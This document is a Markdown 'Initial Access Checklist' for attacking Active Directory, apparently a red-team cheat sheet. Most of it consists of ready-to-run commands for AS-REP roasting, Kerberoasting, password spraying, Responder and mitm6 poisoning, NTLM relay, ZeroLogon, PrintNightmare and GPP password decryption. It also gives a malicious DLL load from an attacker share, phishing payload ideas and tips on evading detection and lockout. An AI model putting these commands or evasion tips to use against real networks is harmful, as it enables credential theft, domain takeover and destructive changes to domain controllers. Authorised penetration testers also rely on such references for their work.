# Initial Access Checklist

## AS-REP Roasting

- [ ] Enumerate users without pre-auth: `Get-NetUser -PreauthNotRequired` — Identify AS-REP roastable accounts
- [ ] Extract AS-REP hashes: `GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -dc-ip <dc-ip>` (Impacket)
- [ ] Extract via Rubeus: `Rubeus asreproast /format:hashcat /outfile:asrep.txt`
- [ ] Extract via CrackMapExec: `crackmapexec ldap <dc-ip> -u <user> -p <pass> --asreproast asrep.txt`
- [ ] Crack AS-REP hashes: `hashcat -m 18200 asrep.txt <wordlist> --force` — Weak passwords crack quickly
- [ ] Check for users with no pre-auth and weak passwords: Likely fast crack
- [ ] **OPSEC**: AS-REP requests are logged as event ID 4768 with pre-auth type 0; noisy in smart environments

## Kerberoasting

- [ ] Enumerate all SPNs: `Get-NetUser -SPN | select samaccountname, serviceprincipalname`
- [ ] Request TGS (Impacket): `GetUserSPNs.py <domain>/<user>:<pass> -request -dc-ip <dc-ip> -outputfile kerb.txt`
- [ ] Request TGS (Rubeus): `Rubeus kerberoast /outfile:kerb.txt`
- [ ] Request TGS (PowerView): `Request-SPNTicket -SPN "<spn>" -Format Hashcat`
- [ ] Targeted Kerberoasting (specific user): `GetUserSPNs.py <domain>/<user>:<pass> -request-user <spn-user> -dc-ip <dc-ip>`
- [ ] Crack Kerberos hashes: `hashcat -m 13100 kerb.txt <wordlist> --force`
- [ ] Check for AES-only encryption: SPNs with only AES enctypes are harder to crack (need RC4)
- [ ] **OPSEC**: Kerberoasting creates event ID 4769; DC will log every request — high risk of detection

## Password Spraying

- [ ] Get password policy: `enum4linux -P <dc-ip>` or `crackmapexec smb <dc-ip> --pass-pol`
- [ ] Spray with CrackMapExec: `crackmapexec smb <dc-ip> -u <users.txt> -p <password> --continue-on-success`
- [ ] Spray via LDAP (stealthier): `crackmapexec ldap <dc-ip> -u <users.txt> -p <password> --continue-on-success`
- [ ] Spray via ADFS/O365: `Spray -d <domain> -p <password> <users.txt>` or use `o365spray`
- [ ] Setup spraying interval: Wait `lockoutThreshold / 2` attempts per lockout window (typically 30 min)
- [ ] Use known seasonal passwords: `Summer2026`, `Winter2026`, `Company2026`
- [ ] **OPSEC**: Stay under lockout threshold; if policy is 10/30min, do 5 sprays per batch, wait 15 min
- [ ] **OPSEC**: Avoid spraying the same account multiple times; track sprayed accounts in a log

## LLMNR / NBT-NS Poisoning

- [ ] Check if LLMNR is enabled: `Get-DnsClient | ? { $_.SuffixSearchList -ne $null }`
- [ ] Check NBT-NS status: `nbtstat -n` or check registry: `HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters`
- [ ] Start Responder: `sudo responder -I <interface> -wrf --lm` — Capture NTLMv1/v2 hashes
- [ ] Enable LLMNR/NBT-NS/mDNS poisoning: `sudo responder -I <interface> -wd`
- [ ] Capture challenge/response: Responder logs NTLMv2 hashes in `/usr/share/responder/logs/`
- [ ] Relay captured hashes (if SMB signing off): `sudo responder -I <interface>; in another window: ntlmrelayx`
- [ ] Crack captured hashes: `hashcat -m 5600 captured.txt <wordlist>`
- [ ] **OPSEC**: Responder poisons all LLMNR/NBT-NS traffic on subnet — very noisy, expect user complaints
- [ ] **OPSEC**: Use `-A` (analyze mode) first to just observe before poisoning

## mitm6 (IPv6 DNS Poisoning)

- [ ] Run mitm6: `sudo mitm6 -d <domain> -i <interface> — Attack via IPv6, many orgs ignore IPv6 security
- [ ] Combine with NTLM relay: `mitm6 -d <domain> -i <interface>; ntlmrelayx -t ldap://<dc-ip> -wh <wp-host>`
- [ ] Target for WPAD: WPAD configuration via DHCPv6 — Users auto-configure proxy to attacker
- [ ] Capture passwords via WPAD: When victim authenticates to proxy, relay to target service
- [ ] **OPSEC**: mitm6 is very noisy on IPv6; only use in assessment phase with permission

## NTLM Relay

- [ ] Find hosts with SMB signing disabled: `nmap --script smb2-security-mode -p 445 <subnet>` — No signing = relayable
- [ ] Find machine account quotas: `crackmapexec ldap <dc-ip> -u <user> -p <pass> -M maq` — Check if MAQ > 10
- [ ] Start impacket relay: `sudo ntlmrelayx.py -t smb://<target-ip> -smb2support` — Simple SMB relay
- [ ] Relay to LDAP for ADCS ESC8: `sudo ntlmrelayx.py -t ldap://<dc-ip> --adcs --template <template>`
- [ ] Relay to HTTP: `sudo ntlmrelayx.py -t http://<target>`
- [ ] Relay to WCF/EWS: Targeting Exchange for credential relay
- [ ] Use Responder with relay: `sudo responder -I <interface> -r -d; sudo ntlmrelayx.py -t smb://<target> -smb2support`
- [ ] **OPSEC**: Relayed authentication needs incoming connection; Responder/Inveigh must be on same L2 segment

## ZeroLogon (CVE-2020-1472)

- [ ] Scan for ZeroLogon: `crackmapexec smb <dc-ip> -M zerologon`
- [ ] Exploit ZeroLogon: `python3 zerologon_tester.py <dc-name> <dc-ip>`
- [ ] ZeroLogon full exploit (set DC password to null): `python3 cve-2020-1472-exploit.py <dc-netbios> <dc-ip>`
- [ ] After exploit — dump creds: `secretsdump.py -no-pass <domain>/<dc-netbios>\$@<dc-ip>`
- [ ] Restore DC password: `python3 restorepassword.py <domain>/<dc-netbios>@<dc-netbios> -target-ip <dc-ip> -hexpass <original-hash>`
- [ ] **OPSEC**: ZeroLogon is extremely destructive; always test in lab first. Restore password or DC becomes unusable
- [ ] **OPSEC**: Generates event IDs 4742, 5805; after exploit, DC logs "machine account password changed"

## PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

- [ ] Check if vulnerable: `crackmapexec smb <target> -M printnightmare`
- [ ] Check via PowerShell: `Get-PrinterDriver -Name "*"`
- [ ] Exploit as admin: `python3 CVE-2021-1675.py <domain>/<user>:<pass>@<target> '\\<attacker>\smb\malicious.dll'`
- [ ] Exploit with System context: `PrintNightmare.exe <target> <user> <pass>`
- [ ] **OPSEC**: PrintNightmare is heavily signatured; modern AV/EDR detects it. Use custom DLLs
- [ ] **OPSEC**: Patch may already break it; verify vulnerability first before attempting

## GPP / SYSVOL Passwords

- [ ] Access SYSVOL share: `ls \\<domain>\SYSVOL\<domain>\Policies\`
- [ ] Search for Groups.xml: `Get-ChildItem \\<domain>\SYSVOL\<domain>\Policies\ -Recurse -Include Groups.xml`
- [ ] Search for all GPP files: `ForEach ($GUID in (Get-ChildItem \\<domain>\SYSVOL\<domain>\Policies\).Name) { Get-ChildItem -Path "\\<domain>\SYSVOL\<domain>\Policies\$GUID\User\Preferences\" -Recurse -ErrorAction SilentlyContinue }`
- [ ] Decrypt GPP password: `gpp-decrypt <cpassword>` — AES encrypted but MS published the key
- [ ] Automated GPP search: `crackmapexec smb <target> -u <user> -p <pass> -M gpp_password`
- [ ] **OPSEC**: SYSVOL is readable by all domain users; low risk but access is logged

## User-Initiated Attacks (Social Engineering)

- [ ] Malicious macro document: Generate with office macros to call back to C2
- [ ] Phishing with link: User clicks link -> browser exploit or credential prompt
- [ ] LNK file dropping: Place shortcut file that executes on open in shared folder
- [ ] ISO/VHD attachment: Use ISO file containing LNK + DLL to bypass Mark-of-the-Web
- [ ] OLE object in Office: Package OLE objects in Office document for code execution
- [ ] **OPSEC**: Macros are heavily blocked in modern Office; signed macros more likely to pass

## External / Remote Access

- [ ] Check VPN portals: Brute-force or spray VPN credentials — Potential initial access
- [ ] Check Citrix / RDS gateways: Exposed remote desktops, often MFA-protected
- [ ] Check OWA / Exchange: Password spraying via Exchange ActiveSync (EWS) — Lower log visibility
- [ ] Check ADFS endpoints: `https://<adfs>/adfs/ls/idpinitiatedsignon.htm` — MFA bypass potential
- [ ] Check Azure AD Connect: Exposed PTA agents — Potential cred theft
- [ ] **OPSEC**: External spray is less monitored, but MFA is common; target non-MFA services first

## OPSEC Summary

| Technique | Log Noise | Detection Risk | Notes |
|---|---|---|---|
| AS-REP Roast | Low-Medium | Medium | Event 4768 with preauth=0 |
| Kerberoast | High | High | Event 4769, multiple from same source |
| Password Spray | Medium | Low-Medium | Stay under lockout threshold |
| LLMNR Poisoning | Very High | Very High | User complaints, local subnet only |
| mitm6 | High | High | IPv6 traffic, easy to spot |
| NTLM Relay | Medium | Medium | Need signing-disabled targets |
| ZeroLogon | Low | High (after) | Destructive, lab test required |
| PrintNightmare | Medium | High | Heavily signatured |
| GPP | Low | Low | Legacy technique, often already patched |

## Decision Flow

1. Start with **password spray** and **AS-REP** (quietest, lowest risk)
2. If you have a foothold, run **Kerberoast**
3. Use **LLMNR/mitm6** if on local subnet and noise is acceptable
4. Use **ZeroLogon/PrintNightmare** only if you have specific permission
5. **GPP** is legacy; check for completeness but don't rely on it
6. Always crack offline; never spray cracked creds from stolen hashes
